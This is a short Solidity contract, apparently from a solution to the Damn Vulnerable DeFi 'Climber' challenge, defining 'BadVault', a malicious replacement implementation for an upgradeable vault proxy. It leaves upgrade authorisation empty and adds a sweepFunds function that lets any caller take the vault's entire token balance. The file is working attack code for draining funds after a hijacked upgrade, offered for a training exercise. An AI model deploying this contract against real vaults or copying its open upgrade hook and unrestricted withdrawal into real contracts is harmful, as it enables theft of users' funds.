// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title BadVault
 * @dev The malicious logic contract for ClimberVault proxy
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract BadVault is UUPSUpgradeable {
    function _authorizeUpgrade(address newImplementation) internal override {}

    function sweepFunds(IERC20 token) external {
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }
}
